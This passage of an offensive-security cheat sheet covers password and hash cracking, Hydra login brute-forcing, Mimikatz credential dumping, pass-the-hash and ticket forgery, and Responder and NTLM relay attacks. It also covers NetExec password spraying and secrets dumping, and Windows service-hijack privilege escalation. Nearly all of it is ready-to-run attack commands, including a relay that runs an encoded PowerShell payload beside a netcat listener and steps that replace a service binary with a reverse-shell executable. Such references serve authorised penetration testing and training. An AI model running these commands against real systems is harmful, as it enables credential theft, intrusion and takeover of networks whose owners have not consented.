8.3 Crack Files

Extract a crackable hash from a password-protected file with a *2john tool, then run John or Hashcat against it offline.

office2john <file> > office.hash
pdf2john <file.pdf> > pdf.txt
# alternative
pdfcrack -f <file.pdf> -w <wordlist>
zip2john <file.zip> > zip.hash
# alternative: brute-force
fcrackzip -u -D -p <wordlist> <file.zip>
keepass2john <Database.kdbx> > keepass.hash
ssh2john <id_rsa> > ssh.hash
rar2john <file.rar> > rar.hash
7z2john <file.7z> > 7z.hash
gpg2john <file.asc> > gpg.hash
bitlocker2john <volume.img> > bitlocker.hash
# Crack with John
john --wordlist=<wordlist> <hash_file>

# Crack with Hashcat (select mode from table below)
hashcat -m <mode> <hash_file> <wordlist>
Tool File Type(s) Hashcat Mode Typical Output Label to Strip Notes
office2john MS Office (.doc, .docx, .xls, .xlsx, .ppt, .pptx) 9400 / 9500 / 9600 / 9700 / 9800 filename: Mode depends on Office version; use hashid or check the $office$ prefix
pdf2john PDF 10400 / 10500 / 10600 / 10700 filename: Mode depends on PDF encryption revision; pdfcrack is an alternative
zip2john ZIP (traditional / AES-256) 13600 (WinZip AES) / 17200 (PKZIP CRC32) filename/entry: Extract single entry hash for speed; drop --format=zip if John errors
rar2john RAR (v3/v4), RAR5 12500 (RAR3) / 13000 (RAR5) filename: RAR5 uses bcrypt derivation — significantly slower
7z2john 7-Zip (.7z) 11600 filename: 7z uses AES-256 + SHA-256; slow but crackable with wordlist + rules
keepass2john KeePass (.kdbx v1 and v2) 13400 Database: Strip the Database: prefix before feeding to Hashcat
ssh2john SSH private keys (RSA, DSA, ECDSA, Ed25519) No direct Hashcat equivalent filename: Newer OpenSSH keys use bcrypt KDF — expect slower cracking
gpg2john PGP/GPG private keys (.asc, .gpg) No direct Hashcat equivalent filename: Use John directly; useful for extracting passphrases from exported GPG keys
bitlocker2john BitLocker-encrypted volumes (.img) 22100 (BitLocker) None Outputs up to four hash types; use the $bitlocker$0$ variant for user password attacks
hash-identifier / hashid Unknown hash string N/A N/A Run these before cracking to confirm the correct mode

8.4 HTTP POST Login Form

Use Hydra's http-post-form module to brute-force web login forms; identify the field names and failure message from the page source or Burp.

# Three colon-separated fields: URI, POST body, failure string
hydra -l <username> -P <wordlist> <target_ip> http-post-form "/<login_uri>:<user_field>=^USER^&<pass_field>=^PASS^:<failure_message>"
# HTTPS variant
hydra -l <username> -P <wordlist> <target_ip> https-post-form "/<login_uri>:<user_field>=^USER^&<pass_field>=^PASS^:<failure_message>"
  • Login page URI: /<login_uri>
  • POST body with username and password: <user_field>=^USER^&<pass_field>=^PASS^, e.g. fm_usr=^USER^&fm_pwd=^PASS^
  • Login failed identifier: <failure_message>, e.g. Login failed. Invalid; use S=<success_text> if the app always returns 200 OK

8.5 HTTP GET (Basic Authentication)

Brute-force HTTP Basic Auth endpoints with Hydra's http-get module.

hydra -l <username> -P <wordlist> <target_ip> http-get /
# HTTPS variant
hydra -l <username> -P <wordlist> <target_ip> https-get /<protected_path>/

8.6 Calculate Cracking Time

Estimate how long a brute-force will take by computing the keyspace and dividing by the measured hash rate.

# Count characters in the charset — gives the keyspace base
echo -n "<characters>" | wc -c

# Compute total combinations for a given password length
python3 -c "print(<keyspace>**<length>)"

# Estimate cracking time from benchmark hash rate
python3 -c "print(<keyspace> / <hash_rate>)"
# Example: 5-character alphanumeric password at 1B hashes/sec
characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
echo -n $characters | wc -c            # keyspace = 62
python3 -c "print(62**5 / 1000000000)" # seconds to exhaust

8.7 Mutating Wordlists

Apply Hashcat rule files to mutate wordlist entries (case changes, substitutions, appends) before cracking. See the Hashcat rule-based attack reference.

hashcat -m <hash_type> <hash_file> <wordlist> -r <rule_file> --force
# John rule-based mutation (CPU-only systems)
john --wordlist=<wordlist> --rules=best64 <hash_file>

8.8 Hashcat Formats for Cracking

Reference matrix of common hash types, their Hashcat mode numbers, and the expected input format.

Hash Type Hashcat Mode (-m) Example Format
MD5 0 $1$salt$hash
SHA-1 100 hash:salt
NTLM 1000 <NTLM_HASH>
Net-NTLMv1 5500 username::domain:challenge:response
Net-NTLMv2 5600 username::domain:challenge:response
bcrypt 3200 $2a$10$abcdefghijklmnopqrstuv
Kerberos 5 TGS-REP etype 23 13100 $krb5tgs$23$*user$realm$service*hash
Kerberos 5 AS-REP etype 23 18200 $krb5asrep$23$user@REALM:hash
MS-Cache v1 1100 username:hash
MS-Cache v2 2100 domain\username:hash:salt
SHA-256 1400 <SHA256_HASH>
SHA-512 1700 <SHA512_HASH>
MD5 Crypt 500 $1$salt$hash
LDAP MD5 25600 {MD5}hash
Hash / Attack Scenario Hashcat Mode (-m) Where Typically Encountered Speed Class Recommended Attack
NTLM (local account) 1000 SAM dump, NTDS.dit, Mimikatz lsadump::sam Very fast (GPU) Wordlist + best64.rule; try PTH if uncrackable
Net-NTLMv2 (captured) 5600 Responder, LLMNR/NBT-NS poisoning, relay attacks Fast Wordlist + rules; relay if cracking fails
Kerberoast TGS (etype 23) 13100 GetUserSPNs.py, Rubeus kerberoast Medium Wordlist + rules; etype 17/18 (AES) is much slower
AS-REP Roast (etype 23) 18200 GetNPUsers.py, Rubeus asreproast Medium Wordlist + rules; targets accounts with pre-auth disabled
Linux SHA-512 crypt 1800 /etc/shadow with $6$ prefix Slow Wordlist + rules; pure BF impractical
bcrypt 3200 Web app databases (PHP, Rails, Django apps), some Linux distros Very slow Small targeted wordlist only; BF infeasible
MS-Cache v2 (DCC2) 2100 Offline domain creds on Windows (HKLM\Security\Cache) Very slow Wordlist + rules; cannot be used for PTH
KeePass (.kdbx) 13400 KeePass database files found on target filesystem Slow Wordlist + rules; strip Database: label before feeding Hashcat
WinZip AES-256 13600 Password-protected ZIP archives Medium Wordlist; extract single-file hash with zip2john for speed

8.9 Password Managers

Locate a KeePass database on a compromised host, extract the hash with keepass2john, crack it offline, then read the entries with kpcli.

# Search for KeePass database files on Windows
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
keepass2john <Database.kdbx> > keepass.hash
# Strip the leading "Database:" prefix — hash must start with $keepass$
hashcat -m 13400 keepass.hash <wordlist> -r <rule_file> --force
kpcli --kdb=Database.kdbx
# Inside kpcli:
cd Database/
ls
show [-f] [-a] <entry_id>
get <entry_path> <field_name>

8.10 SSH Passphrases

Convert a passphrase-protected SSH private key to a crackable hash with ssh2john, then run John against it.

chmod 600 <id_rsa>
ssh2john <id_rsa> > ssh.hash
# If ssh2john alias is missing:
python3 /usr/share/john/ssh2john.py <id_rsa> > ssh.hash
john --wordlist=<password_list> --rules=<rules_file> ssh.hash

8.11 Linux Users Hashes

Pull hashes from /etc/shadow, identify the algorithm from the prefix, and crack offline with Hashcat.

  • $1$ = MD5 (mode 500), $5$ = SHA-256 (mode 7400), $6$ = SHA-512 (mode 1800), $y$ = yescrypt (mode 25400)
  • Accounts with ! or * in the hash field are locked and have no crackable hash
# Extract only the hash field and save to a file, then crack
hashcat -m 1800 <hash_file>.txt <wordlist>
# John: combine passwd + shadow first
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=<wordlist>

8.12 Mimikatz Commands

Mimikatz extracts credentials from Windows LSASS memory and the SAM/NTDS database; elevate to SYSTEM first, then use the appropriate module.

  • Always run privilege::debug then token::elevate before any dump command
  • DCSync (lsadump::dcsync) does not touch LSASS — it mimics a DC replication request and requires Replicating Directory Changes All (Domain Admins by default)
  • WDigest cleartext is disabled by default on Windows 8.1+ and Server 2012 R2+
  • Pass-the-Hash works against any NTLM-auth service; Pass-the-Ticket injects a stolen Kerberos ticket valid until expiry (default 10 h)
  • Golden Ticket requires the krbtgt hash via DCSync; Silver Ticket requires only the target service account hash and bypasses the KDC

8.12.1 Do Not Require Credentials

These modules run once you hold SYSTEM or SeDebugPrivilege.

Description Command Notes on Methodology
Privilege Escalation to SYSTEM privilege::debug
token::elevate		 Run first; needs local admin to obtain SeDebugPrivilege
Dumping Password Hashes from SAM lsadump::sam Local-account NTLM hashes (needs SYSTEM)
Dumping Credentials from LSA Secrets lsadump::secrets Service-account & cached LSA secrets (needs SYSTEM)
Dumping Domain Cached Credentials (DCC) lsadump::cache Domain Cached Credentials (MSCACHE); crack offline
Retrieve Trust Authentication Information lsadump::trust Inter-domain trust keys
Dumping Kerberos Tickets sekurlsa::tickets Tickets from LSASS for Pass-the-Ticket
Extracts Credentials from LSA lsadump::lsa /inject Injects into LSASS to pull secrets (needs SYSTEM)
Dumping WDIGEST Credentials sekurlsa::wdigest Clear-text creds if WDigest is enabled (older Windows)
Dumping Clear-Text Credentials sekurlsa::logonpasswords The classic full logon-credential dump
Dumping NTLM Hashes from LSASS Memory sekurlsa::msv NTLM hashes for Pass-the-Hash
Dumping Kerberos Keys sekurlsa::kerberos Kerberos encryption keys
Dumping SSP Credentials sekurlsa::ssp Security Support Provider credentials
Dumping TSPKG Credentials sekurlsa::tspkg Terminal-Services package credentials
Listing Available Privileges privilege::list Enumerate the current token's privileges
Extracts Passwords from Windows Vault vault::cred /patch Stored Windows Vault credentials
Dumping SAM — Offline lsadump::sam /system:<SYSTEM> /sam:<SAM> Offline dump from saved SYSTEM + SAM hives
DCSync lsadump::dcsync /domain:<DOMAIN> /user:<USERNAME> DCSync via DRSUAPI; requires replication rights (DA-equivalent)

8.12.2 Require Credentials

These modules accept a hash or ticket you already hold and use it to spawn processes or forge tickets.

Description Command Notes on Methodology
Pass-the-Hash Attack (PTH) sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND> Spawn a process as the user with only the NTLM hash
Pass-the-Ticket Attack (PTT) kerberos::ptt <ticket.kirbi> Inject a stolen TGT/TGS into the current session
Over-Pass-The-Hash / Pass-The-Key (AES) sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<AES256_HASH> /run:<COMMAND> Use AES keys instead of NTLM (stealthier)
Over-Pass-the-Hash (with RC4) sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND> Over-Pass-the-Hash using the RC4/NTLM key
Golden Ticket Creation kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID> /ticket:<OUTPUT_TICKET> Forge a TGT with the krbtgt hash — domain-wide persistence
Silver Ticket Creation kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SERVICE/SERVER> /service:<SERVICE> /rc4:<NTLM_HASH> /id:<USER_RID> /ptt Forge a service ticket from a service-account hash
Kerberos Silver Ticket Creation (Advanced) kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_HASH> /service:<SERVICE> /sid:<DOMAIN_SID> Dedicated silver-ticket module
Dump Kerberos Tickets for Specific User sekurlsa::tickets /export Export tickets to .kirbi for reuse
Extracting TGT from LSASS Memory kerberos::tgt Retrieve the current TGT from LSASS
Skeleton Key Injection misc::skeleton Patches LSASS so any user logs in with password "mimikatz" (needs DA on a DC)
DPAPI Credential Decryption dpapi::cred /in:<CREDENTIAL_FILE> Decrypt DPAPI-protected stored credentials

8.12.3 Mimikatz One-Liners

Use one-liner invocations in non-interactive shells (Evil-WinRM, web shells, unstable reverse shells) where the interactive prompt would hang.

.\mimikatz.exe "privilege::debug" "[command]" "exit"

# Dump logon passwords
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:[domain] /rc4:[hash]" "exit"

# Save output to file
mimikatz.exe "privilege::debug" "[command]" "exit" > C:\temp\mimikatz_output.txt
# Remote execution via PsExec
impacket-psexec [domain]/[user]:[password]@[target_ip] "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

# Remote execution via WMIExec
impacket-wmiexec [domain]/[user]:[password]@[target_ip] "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

8.13 NTLM

Dump local NTLM hashes from the SAM database with Mimikatz, then crack offline or pass the hash directly.

  • NTLM hashes (from SAM/NTDS) can be used directly for PTH; Net-NTLMv1/v2 (from Responder/capture) must be cracked first — they cannot be used for PTH
  • If live Mimikatz is blocked, save the hives offline: reg save HKLM\SAM sam.hive and reg save HKLM\SYSTEM system.hive, then parse with impacket-secretsdump -sam sam.hive -system system.hive LOCAL
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
# Pass the hash if uncrackable
impacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Lateral movement at scale (pre-LAPS environments)
crackmapexec smb <subnet> -u Administrator --local-auth -H <NTLM_HASH>

8.14 Pass-The-Hash NTLM

Once you have an NTLM hash from the SAM database you can authenticate to remote services without knowing the plaintext password.

  • PtH only works with NT hashes (the right half of LM:NT); pass aad3b435b51404eeaad3b435b51404ee as the LM half when it is unknown.
  • PsExec creates and starts a service on the target (noisy: Event IDs 7045 and 4624); WMIExec leaves fewer artefacts.
  • PtH does not work against accounts protected by Credential Guard or where network logons are restricted via LocalAccountTokenFilterPolicy.
Credential type What it is Reusable directly? Hashcat mode Primary attack
NTLM hash (NT hash) MD4 hash of the Unicode password; stored in SAM / NTDS.dit / LSASS memory Yes — used directly for Pass-the-Hash -m 1000 Pass-the-Hash, Overpass-the-Hash, offline crack
Net-NTLMv1 hash Challenge-response computed during an NTLM network authentication (older algorithm); captured on the wire No — cannot be passed; must be cracked or relayed -m 5500 Offline crack (fast) or NTLM relay
Net-NTLMv2 hash Salted challenge-response (NTLMv2 algorithm); captured by Responder / LLMNR poisoning No — cannot be passed; must be cracked or relayed -m 5600 Offline crack (slower) or NTLM relay
Kerberos TGT / service ticket Encrypted ticket issued by the KDC; stored in memory or exportable as .ccache / .kirbi Yes — used for Pass-the-Ticket within ticket lifetime N/A (Kerberoast TGS: -m 13100) Pass-the-Ticket, Overpass-the-Hash, Kerberoasting
Technique Input credential Protocol used Precondition Key tools OPSEC noise
Pass-the-Hash (PtH) NT hash NTLM Account has local admin / remote exec rights on target; Credential Guard disabled impacket-psexec -hashes, impacket-wmiexec -hashes, netexec smb -H, evil-winrm -H, xfreerdp /pth: Medium-High (service creation with PsExec; WMIExec lower)
Pass-the-Ticket (PtT) Kerberos TGT or service ticket (.ccache / .kirbi) Kerberos Valid ticket not yet expired; ticket exported from LSASS or forged (Golden/Silver) mimikatz sekurlsa::tickets /export, Rubeus.exe ptt, impacket-ticketer, KRB5CCNAME=ticket.ccache netexec -k Low-Medium (no NTLM traffic; blends with normal Kerberos)
Overpass-the-Hash (OPtH) NT hash → converted to Kerberos TGT Kerberos (initiated from NTLM hash) Same as PtH for extraction; domain connectivity to request TGT from KDC mimikatz sekurlsa::pth /ntlm:HASH /user:USER /domain:DOM /run:cmd, Rubeus.exe asktgt /rc4:HASH Low (avoids NTLM on the wire after initial TGT request) 
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
# PsExec - remote shell
impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
# WMIExec - WMI-based execution
impacket-wmiexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
# xfreerdp - RDP session
xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>

8.15 Cracking Net-NTLMv2

Responder poisons LLMNR/NBT-NS requests and captures Net-NTLMv2 challenge-response hashes that can be cracked offline with hashcat mode 5600.

sudo responder -I <interface>
# Crack captured Net-NTLMv2 hash
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt --force

8.16 Relaying Net-NTLMv2

Instead of cracking, relay the captured Net-NTLMv2 authentication directly to a target host to execute commands — no password required.

  • SMB signing must be disabled on the relay target; use netexec smb --gen-relay-list or nmap --script smb2-security-mode to identify unsigned hosts first.
  • Disable Responder's SMB and HTTP servers (/etc/responder/Responder.conf: SMB = Off, HTTP = Off) before starting ntlmrelayx, or Responder will consume the connection.
  • You cannot relay an authentication back to the same machine it originated from.
  • Omitting -c causes ntlmrelayx to dump the SAM database automatically if the relayed account has local admin rights.
impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "powershell -enc <base64_payload>"
nc -nvlp [port]

8.17 Online Tools

Useful web services for hash identification and lookup without local cracking resources.

  • CrackStation — large precomputed hash lookup database
  • Hashes.com — Hash Identifier — identify hash type from a sample
  • Hashes.com — Decrypt Hash — reverse lookup against community-sourced plaintext database

8.18 Default Credentials

Always try default and context-specific credentials before launching a full brute-force; many targets are compromised in seconds.

  • Some platforms enforce lockout after a small number of failures; check the policy with --pass-pol in NetExec before spraying more than a handful of guesses.
# https://github.com/ihebski/DefaultCreds-cheat-sheet
sudo pip3 install defaultcreds-cheat-sheet

creds search [service/web_server/term]
creds search [service/web_server/term] export
creds update
creds search [service/web_server/term] --proxy=http://localhost:8080
root:root
admin:admin
admin:password
admin:1234
administrator:admin
guest:guest
user:user
test:test
postgres:postgres
mysql:mysql
USERK:USERK        # try box/service name as both user and pass
cassie:cassie      # username found via exiftool metadata

Guessing strategy: start with common combinations, then try box/service-specific names (check exiftool metadata for embedded usernames), then fall back to a dictionary attack using a wordlist like SecLists. Also check vendor documentation and device manuals for product-specific defaults.

8.19 Recommended Wordlists

Standard wordlist paths on Kali — use the one that matches the attack type.

  • Cracking hashes / passwords: /usr/share/wordlists/rockyou.txt
  • DNS enumeration: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
  • SNMP community strings brute-force: /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
  • Username enumeration (ASREPRoasting, Kerbrute, Kerberoasting): /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
  • Web directory enumeration: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt, /usr/share/dirb/wordlists/common.txt, /usr/share/dirb/wordlists/big.txt
  • Web file enumeration: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt

8.20 NetExec (NCX)

NetExec (NCX) is the modern successor to CrackMapExec; use it to spray credentials, enumerate hosts, dump secrets, and run modules across SMB, LDAP, SSH, WinRM, MSSQL, FTP, and more. Source and updates on the GitHub repository; full module reference in the Wiki documentation.

8.20.1 Enumeration

Start with null and guest probes to map what is exposed before authenticating.

# Basic SMB fingerprint
netexec smb target

# Null / guest session
netexec smb target -u '' -p ''
netexec smb target -u 'guest' -p ''

# Shares
netexec smb target -u '' -p '' --shares
netexec smb target -u [username] -p [password] --shares
netexec smb target --shares --policies

# Users and groups
netexec smb target --groups
netexec smb target -u '' -p '' --users
netexec smb target -u [username] -p [password] --users

# RID cycling
netexec smb target -u '' -p '' --rid-brute
netexec smb target -u '' -p '' --rid-brute --rid-range 500-1100

8.20.2 Password Spraying

Wrap credentials containing special characters (especially !) in single quotes. The table below shows what a Pwn3d! result means per protocol.

Protocol Pwn3d! meaning
FTPNo check
SSHRoot (otherwise specific message) ✅
WinRMCode execution at least 👾
LDAPPath to domain admin 👑
SMBMost likely local admin ✅
RDPCode execution at least 👾
VNCCode execution at least 👾
WMIMost likely local admin ✅
MSSQL------
NFS------
 
# Special characters - wrap in single quotes
netexec smb target -u [username] -p '[P@$$w0rd!]'

# Spray with files
netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt
netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt --local-auth

# Multiple credentials
netexec [protocol] [target(s)] -u username1 -p password1 password2
netexec [protocol] [target(s)] -u username1 username2 -p password1

# NTLM hash spray
netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt
netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --local-auth

# SMB - continue on success
netexec smb target -u [usernames].txt -p [password] --continue-on-success

# Pair user→pass 1:1 (no bruteforce)
netexec smb target -u [usernames].txt -p [passwords].txt --no-bruteforce --continue-on-success
netexec [protocol] [target(s)] -u [usernames].txt -p [passwords.txt] --no-bruteforce
netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --no-bruteforce

# SSH
netexec ssh target -u [username] -p [password] --continue-on-success
# --no-bruteforce pairing order
user1 -> pass1
user2 -> pass2
# Local auth
netexec smb target -u [username] -p '[password]' --local-auth
netexec smb [target] -u [username] -H '[LM:NT]' --local-auth
netexec smb [target] -u [username] -H '[NTHASH]' --local-auth
netexec smb [target] -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
netexec smb [target] -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth

# Kerberos
netexec smb target -u [username] -p [password] -k

8.20.3 SMB

Run bulk enumeration or spider shares to find readable files and sensitive data.

# All-in-one enumeration
netexec smb target -u [username] -p [password] --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol

# spider_plus - index all readable share content (read-only by default)
netexec smb target -u [username] -p [password] -M spider_plus

# Download all files
netexec smb target -u [username] -p [password] -M spider_plus -o READ_ONLY=false

# Dump a specific file
netexec smb target -u [username] -p [password] -k --get-file target_file output_file --share sharename

8.20.4 FTP

List and retrieve files over FTP using NetExec's built-in FTP module.

netexec ftp target -u [username] -p [password] --ls
netexec ftp target -u [username] -p [password] --ls folder_name
netexec ftp target -u [username] -p [password] --ls folder_name --get file_name

8.20.5 LDAP

Use LDAP to enumerate domain objects and pull Kerberoastable / AS-REP-roastable accounts.

# Null session
netexec ldap target -u '' -p '' --users

# All-in-one LDAP enumeration
netexec ldap target -u [username] -p [password] --trusted-for-delegation --password-not-required --admin-count --users --groups

# Kerberoastable accounts
netexec ldap target -u [username] -p [password] --kerberoasting kerb.txt

# AS-REP roastable accounts
netexec ldap target -u [username] -p [password] --asreproast asrep.txt

8.20.6 MSSQL

Authenticate against MSSQL and execute OS commands via xp_cmdshell when available.

netexec mssql target -u [username] -p [password]

# -X for PowerShell, -x for cmd
netexec mssql target -u [username] -p [password] -x [command_to_execute]

netexec mssql target -u [username] -p [password] --get-file output_file target_file

8.20.7 Secrets Dump

Requires at least local admin on the target; dump credential stores from SAM, LSA, NTDS, LSASS, and more.

# SAM database
nxc smb target -u [username] -p [password] --sam
# LSA secrets
netexec smb target -u [username] -p [password] --local-auth --lsa
# If _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} appears, use gMSA commands below
# NTDS.dit (Active Directory database)
netexec smb target -u [username] -p [password] --ntds
# LSASS via lsassy
nxc smb target -u [username] -p [password] -M lsassy
# LSASS via nanodump
nxc smb target -u [username] -p [password] -M nanodump
# Mimikatz module (needs local admin)
nxc smb target -u [username] -p [password] -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
# gMSA
netexec ldap target -u [username] -p [password] --gmsa-convert-id id
netexec ldap domain -u [username] -p [password] --gmsa-decrypt-lsa gmsa_account

# GPP passwords
netexec smb [target] -u [username] -p [password] -M gpp_password

# LAPS
netexec smb [target] -u [username] -p [password] --laps

# DPAPI
netexec smb [target] -u [username] -p [password] --laps --dpapi

# WiFi credentials
netexec smb [target] -u [username] -p [password] -M wifi

# KeePass
nxc smb [target] -u [username] -p [password] -M keepass_discover
nxc smb [target] -u [username] -p [password] -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"

8.20.8 BloodHound

Configure the NetExec BloodHound integration once, then collect graph data in a single command.

  1. Edit ~/.nxc/nxc.conf:
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = user
bh_pass = pass
  1. Collect data:
netexec ldap [target] -u [username] -p [password] --bloodhound -ns ip --collection All

8.20.9 Useful Modules

Quick-reference for commonly used NetExec modules spanning recon, exploitation, and vulnerability checks.

Module Protocol Purpose Requires local admin? Typical follow-up
spider_plus SMB Recursively index / download all readable share content No (uses granted share ACLs) Grep JSON output for passwords, config files, scripts
lsassy SMB Read LSASS memory via ProcDump / comsvcs.dll to extract plaintext and hashes Yes Pass-the-Hash or lateral movement with recovered creds
slinky SMB Plant .lnk shortcuts in writable shares to trigger passive NTLM capture No (write access to share sufficient) Capture hash with Responder; crack or relay
gpp_password SMB Extract and decrypt cpassword from GPP XML files in SYSVOL No (SYSVOL readable by all domain users) Try decrypted password for current user or service accounts
ldap-checker LDAP Check whether LDAP signing and channel binding are enforced No Confirm viability of LDAP relay; pivot to SMB targets if enforced
adcs LDAP Enumerate Active Directory Certificate Services templates and CAs No Feed findings to Certipy for ESC1–ESC8 exploitation
maq LDAP Check ms-DS-MachineAccountQuota — how many machine accounts a user can add No If > 0, create computer account for RBCD or Shadow Credentials attack
veeam SMB Extract plaintext credentials from local Veeam SQL database Yes Backup account creds often have domain-wide read access
zerologon SMB Check for CVE-2020-1472 (unauthenticated DC credential reset) No (network reachability to DC only) If vulnerable, reset DC machine account hash and DCSync
nopac SMB Check for CVE-2021-42278/42287 (privilege escalation to DA from domain user) No (domain user sufficient) Run noPac exploit tool to obtain TGT as DA 
netexec smb ip -u [username] -p [password] -M webdav
netexec smb [target] -u [username] -p [password] -M veeam
netexec smb ip -u [username] -p [password] -M slinky
netexec smb ip -u [username] -p [password] -M ntdsutil
netexec ldap [target] -u [username] -p [password] -M ldap-checker
netexec smb [target] -u [username] -p [password] -M zerologon
netexec smb [target] -u [username] -p [password] -M petitpotam
netexec smb [target] -u [username] -p [password] -M nopac
netexec ldap [target] -u [username] -p [password] -M maq
netexec ldap [target] -u [username] -p [password] -M adcs
netexec smb [target] -u [username] -p [password] -M msol

8.20.10 NTLM Relay Attack

Identify hosts with SMB signing disabled, capture NTLM hashes with Responder, and relay them with ntlmrelayx.

  • SMB signing must be disabled or not required on the relay target; DCs require signing by default and will reject relayed connections.
  • Disable Responder's SMB and HTTP servers before starting ntlmrelayx (/etc/responder/Responder.conf: SMB = Off, HTTP = Off).
  • Use -tf relay.txt to relay to multiple targets simultaneously.
  • Omitting -c auto-dumps the SAM database if the relayed account has local admin rights.
# Build relay target list - hosts with SMB signing disabled
netexec smb [target(s)] --gen-relay-list relay.txt
nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 [target(s)]
responder -I eth0
impacket-ntlmrelayx -tf relay.txt -smb2support

8.20.11 Impersonate Logged-on Users

Requires at least local admin on the remote target; run commands as any currently logged-on user via a scheduled task.

# Enumerate logged-on users
nxc smb [target] -u [localAdmin] -p [password] --loggedon-users

# Execute a command as a logged-on user
nxc smb [target] -u [localAdmin] -p [password] -M schtask_as -o USER=[logged-on-user] CMD=[cmd-command]

8.20.12 Multi-Domain Environment

Pass a file of DOMAIN\user pairs to spray credentials across multiple domains in one run.

netexec [protocol] [target(s)] -u FILE -p password
DOMAIN1\user
DOMAIN2\user
# Generate the domain\user list
python3 script.py -u [users_list].txt -d [domains_list].txt
import argparse

def main():
    parser = argparse.ArgumentParser(description="Generate combinations of domains and users.")
    parser.add_argument("-d", "--domain", required=True, help="Path to the domains file")
    parser.add_argument("-u", "--users", required=True, help="Path to the users file")
    parser.add_argument("-o", "--output", default="output.txt", help="Output file name (default: output.txt)")
    args = parser.parse_args()

    try:
        with open(args.domain, "r") as domains_file:
            domains = [line.strip() for line in domains_file.readlines()]
        with open(args.users, "r") as users_file:
            users = [line.strip() for line in users_file.readlines()]
    except FileNotFoundError as e:
        print(f"Error: {e}")
        return

    combinations = [f"{domain}\\{user}" for user in users for domain in domains]

    with open(args.output, "w") as output_file:
        output_file.write("\n".join(combinations))

    print(f"Combinations generated and saved to {args.output}!")

if __name__ == "__main__":
    main()

9. Windows Privilege Escalation

Windows privesc is almost always a misconfiguration, not a kernel CVE. Run an automated enumerator (WinPEAS, PowerUp, Seatbelt) to surface candidates, then manually verify the high-signal paths: service permissions, unquoted paths, AlwaysInstallElevated, token impersonation, stored credentials, scheduled tasks, and shadow copies. Kernel exploits are a last resort and only when the patch level confirms a known CVE.

9.1 Enumeration

# Identity + system info
whoami /all                                  # privileges + groups + integrity level
systeminfo                                    # OS version + patch level + uptime
hostname; ipconfig /all
net user; net localgroup administrators
wmic qfe get HotFixID,InstalledOn            # installed hotfixes
schtasks /query /fo LIST /v                  # scheduled tasks
sc query                                      # services
tasklist /svc                                 # processes + their services

# Patch-to-exploit suggestion
wesng --update
wesng systeminfo.txt                          # python wes-ng

# Automated scripts (download then run)
# WinPEAS:   .\winPEASx64.exe quiet,searchall
# PowerUp:   Import-Module .\PowerUp.ps1; Invoke-AllChecks
# Seatbelt:  .\Seatbelt.exe -group=all
# Watson:    .\Watson.exe                       (KB-to-CVE mapping)

9.2 Service Misconfigurations

# Weak service permissions — can we modify binPath?
sc qc <service>                              # show current binPath + start type
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *                # legacy creds
Get-WmiObject win32_service | Where-Object {$_.StartMode -eq "Auto"} | Select Name,PathName

# Hijack the binPath
sc config <service> binPath= "C:\Temp\rev.exe"
sc start <service>

# Unquoted service path — when a service binary path contains spaces and isn't quoted,
# Windows walks each space-delimited prefix searching for an executable. Drop one in a
# writable location and start the service.
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """

# Service binary hijacking — replace the actual exe if writable
icacls "C:\Program Files\Some App\service.exe"
copy rev.exe "C:\Program Files\Some App\service.exe"
sc start <service>

# Service DLL hijacking — service loads a DLL from a writable directory by relative path
